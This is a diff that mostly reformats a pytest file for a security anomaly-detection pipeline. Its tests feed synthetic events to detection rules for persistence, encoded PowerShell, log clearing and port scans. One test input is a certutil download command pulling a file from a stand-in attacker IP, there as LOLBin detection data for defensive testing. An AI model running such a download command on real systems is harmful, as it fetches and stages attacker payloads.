@@ -37,13 +37,21 @@ class _Store:
         self.sigma = []
 
     def add(self, minutes, event_type="auth_failure", ip=ATTACKER, **attributes):
-        self.events.append({
-            "id": len(self.events) + 1,
-            "timestamp": (T0 + timedelta(minutes=minutes)).isoformat(),
-            "device_id": "dev-demo", "user_id": "user-demo", "host": "demo-host-01",
-            "effective_username": "bob.demo", "source_ip": ip, "event_type": event_type,
-            "raw_message": "synthetic", "attributes": attributes, "is_synthetic": False,
-        })
+        self.events.append(
+            {
+                "id": len(self.events) + 1,
+                "timestamp": (T0 + timedelta(minutes=minutes)).isoformat(),
+                "device_id": "dev-demo",
+                "user_id": "user-demo",
+                "host": "demo-host-01",
+                "effective_username": "bob.demo",
+                "source_ip": ip,
+                "event_type": event_type,
+                "raw_message": "synthetic",
+                "attributes": attributes,
+                "is_synthetic": False,
+            }
+        )
 
     def since(self, device_id, after_id, limit=500):
         return [e for e in self.events if e["id"] > after_id][:limit]
@@ -85,10 +93,21 @@ def orchestrator():
     o._trained = True
     o._last_run = {}
     o.baseline = _Layer(lambda df: [{"z_max": 0.0, "is_baseline_anomaly": False}] * len(df))
-    o.ensemble = type("E", (), {"predict": staticmethod(lambda df: [
-        {"is_anomaly": False, "anomaly_score": 0.0, "votes": 0, "total_models": 3}] * len(df))})()
-    o.autoencoder = _Layer(lambda df: [
-        {"reconstruction_error": 0.0, "is_ae_anomaly": False}] * len(df))
+    o.ensemble = type(
+        "E",
+        (),
+        {
+            "predict": staticmethod(
+                lambda df: (
+                    [{"is_anomaly": False, "anomaly_score": 0.0, "votes": 0, "total_models": 3}]
+                    * len(df)
+                )
+            )
+        },
+    )()
+    o.autoencoder = _Layer(
+        lambda df: [{"reconstruction_error": 0.0, "is_ae_anomaly": False}] * len(df)
+    )
     o.incident_manager = type("I", (), {"process_anomaly": staticmethod(lambda res: 1)})()
     return o
 
@@ -135,21 +154,40 @@ def test_without_context_the_same_run_stays_quiet(store, orchestrator, monkeypat
     assert store.anomalies == []
 
 
-@pytest.mark.parametrize("event_type,attributes,rule_id", [
-    ("service_install", {"image_path": "C:\\Windows\\Temp\\demo_updater.exe --svc"},
-     "lsadra-persist-service-install"),
-    ("scheduled_task_create", {"task_command": "C:\\Windows\\Temp\\demo.exe"},
-     "lsadra-persist-scheduled-task"),
-    ("process_exec", {"process_name": "powershell.exe", "encoded_command_len": 40},
-     "lsadra-proc-encoded-powershell"),
-    ("process_exec", {"process_name": "certutil.exe", "parent_process": "cmd.exe",
-                      "cmdline": "certutil.exe -urlcache -f http://203.0.113.5/a C:\\Users\\Public\\a"},
-     "lsadra-proc-lolbin-proxy-execution"),
-    ("cron_modified", {"cron_user": "bob.demo"}, "lsadra-persist-cron-modified"),
-    ("log_cleared", {"event_id": "1102"}, "lsadra-impair-event-log-cleared"),
-])
-def test_v4_rules_run_on_the_live_path(store, orchestrator, monkeypatch,
-                                       event_type, attributes, rule_id):
+@pytest.mark.parametrize(
+    "event_type,attributes,rule_id",
+    [
+        (
+            "service_install",
+            {"image_path": "C:\\Windows\\Temp\\demo_updater.exe --svc"},
+            "lsadra-persist-service-install",
+        ),
+        (
+            "scheduled_task_create",
+            {"task_command": "C:\\Windows\\Temp\\demo.exe"},
+            "lsadra-persist-scheduled-task",
+        ),
+        (
+            "process_exec",
+            {"process_name": "powershell.exe", "encoded_command_len": 40},
+            "lsadra-proc-encoded-powershell",
+        ),
+        (
+            "process_exec",
+            {
+                "process_name": "certutil.exe",
+                "parent_process": "cmd.exe",
+                "cmdline": "certutil.exe -urlcache -f http://203.0.113.5/a C:\\Users\\Public\\a",
+            },
+            "lsadra-proc-lolbin-proxy-execution",
+        ),
+        ("cron_modified", {"cron_user": "bob.demo"}, "lsadra-persist-cron-modified"),
+        ("log_cleared", {"event_id": "1102"}, "lsadra-impair-event-log-cleared"),
+    ],
+)
+def test_v4_rules_run_on_the_live_path(
+    store, orchestrator, monkeypatch, event_type, attributes, rule_id
+):
     store.add(0, event_type=event_type, ip=None, **attributes)
     _run(orchestrator, monkeypatch)
     assert [a["rule_id"] for a in store.anomalies] == [rule_id]
@@ -157,8 +195,13 @@ def test_v4_rules_run_on_the_live_path(store, orchestrator, monkeypatch,
 
 def test_port_scan_on_the_live_path(store, orchestrator, monkeypatch):
     for i in range(20):
-        store.add(i * 0.1, event_type="firewall_deny", ip="203.0.113.7",
-                  dest_ip="192.0.2.10", dest_port=1000 + i)
+        store.add(
+            i * 0.1,
+            event_type="firewall_deny",
+            ip="203.0.113.7",
+            dest_ip="192.0.2.10",
+            dest_port=1000 + i,
+        )
     _run(orchestrator, monkeypatch)
     assert "lsadra-net-port-scan" in {a["rule_id"] for a in store.anomalies}
 
@@ -168,7 +211,13 @@ def test_benign_events_raise_nothing(store, orchestrator, monkeypatch):
     store.add(1, event_type="process_exec", ip="192.0.2.31", binary="/usr/bin/git")
     store.add(2, event_type="cron_job", ip=None, job_name="logrotate")
     store.add(3, event_type="sudo_exec", ip="192.0.2.31", command="/usr/bin/id")
-    store.add(4, event_type="network_flow", ip="192.0.2.31", dest_ip="192.0.2.10",
-              dest_port=443, bytes_out=20_000)
+    store.add(
+        4,
+        event_type="network_flow",
+        ip="192.0.2.31",
+        dest_ip="192.0.2.10",
+        dest_port=443,
+        bytes_out=20_000,
+    )
     _run(orchestrator, monkeypatch)
     assert store.anomalies == []
